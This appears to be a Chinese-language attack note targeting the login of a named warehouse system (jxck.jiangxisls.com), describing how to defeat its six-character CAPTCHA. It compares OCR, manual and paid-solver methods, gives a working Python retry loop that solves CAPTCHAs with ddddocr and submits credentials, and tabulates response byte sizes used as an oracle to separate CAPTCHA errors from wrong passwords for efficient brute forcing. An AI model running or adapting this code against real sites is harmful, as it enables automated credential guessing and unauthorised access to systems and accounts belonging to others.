# jiangxisls K11 — 6 位验证码 ddddocr 方案 + 自校验重试循环

> 目标：jxck.jiangxisls.com K11 仓库系统登录闸
> 手法：ddddocr OCR（≈83%）+ 自校验循环（验证码错→换图重试）→ 可靠自动化
> 对照：本机视觉精读 100%（22/22 + 3/3），ddddocr 5/6 字符常错 1 位

## 验证码特征

| 项 | 值 |
|----|-----|
| 生成端点 | `/codeimg.php`（85×30 PNG，与 PHPSESSID 绑定） |
| 字符集 | 6 位数字+字母混合 |
| 干扰 | 有噪点和线条，但字符间距较大 |
| 一次性 | ✅（同码第二次提交 = 「验证码输入错误」21B） |
| 大小写敏感 | ✅ |
| 参数可控 | ❌（`?debug/code/show` 全无效） |

## 三种识别方案对比

| 方案 | 准确率 | 速度 | 适用场景 |
|------|--------|------|---------|
| **ddddocr 默认模型** | ≈83%（6 位常错 1 位） | 快（本地推理） | 自动化批量+自校验循环 |
| **本机视觉精读** | 100%（25/25） | 慢（手工放大 8-10×） | 高价值单次尝试 |
| **打码平台** | 90-95% | 中（网络延迟） | 大批量爆破 |

## 自校验重试循环（关键模式）

```python
import ddddocr, requests

ocr = ddddocr.DdddOcr()
session = requests.Session()

def attempt_login(username, password):
    """一次完整的登录尝试（含验证码自校验）"""
    for retry in range(5):  # 最多重试 5 次验证码
        # 1. 取验证码
        cap_resp = session.get("https://target/codeimg.php", verify=False)
        code = ocr.classification(cap_resp.content)
        
        # 2. 长度校验（6 位才提交）
        if len(code) != 6:
            continue
        
        # 3. 提交登录
        resp = session.post("https://target/login.php?ac=login",
            data={"name": username, "pass": password, "code": code},
            verify=False)
        
        body = resp.text
        
        # 4. 自校验分流
        if "验证码输入错误" in body:  # 21B → 验证码错，换图重试
            continue
        elif body.strip() == "1":      # 4B → 登录成功！
            return True
        elif "账号或者密码错误" in body:  # 24B → 凭据错，不用重试验证码
            return False
        elif "填写不符合要求" in body:    # 91B → 格式不合规
            return False
    
    return None  # 验证码 5 次都没对
```

**核心思路**：ddddocr 准确率不够没关系 — 「验证码输入错误」(21B) 和「账号或者密码错误」(24B) 的**字节级差异**可以精确区分验证码错 vs 凭据错。验证码错就换图重试，不浪费凭据尝试次数。

## 登录闸 5 态响应序列

| 条件 | 响应体 | 字节 | 判定 |
|------|--------|------|------|
| `name` 不符 `^[0-9a-zA-Z_\-]{6,}$` | 「登录账号填写不符合要求...」 | 91B | 格式错 |
| `pass` <6 位 / 数组 / 缺失 | 「密码错误」 | 12B | 格式错 |
| 验证码错 | 「验证码输入错误」 | 21B | **换图重试** |
| 验证码对 + 凭据错 | 「账号或者密码错误」 | 24B | **下一个凭据** |
| 成功 | `1` | 4B | ★ 拿到会话 |

**★ 无账号存在性 oracle**：格式错/验证码错/凭据错三个分支都与账号是否存在无关。

## 通用教训

1. **ddddocr 不完美没关系** — 关键是有自校验机制区分「验证码错」和「凭据错」
2. **字节级响应差异 = 最精确的 oracle** — 21B vs 24B vs 12B vs 91B vs 4B 五态全区分
3. **验证码一次性 = 1 解图 = 1 次凭据尝试** — 不能复用，每次必须重新取图
4. **`len(code)==6` 前置过滤** — 减少无效提交（ddddocr 常把 6 位识别成 5 位）
5. **必须 HTTPS** — HTTP 通道 302 会丢 POST body，造成假阳性
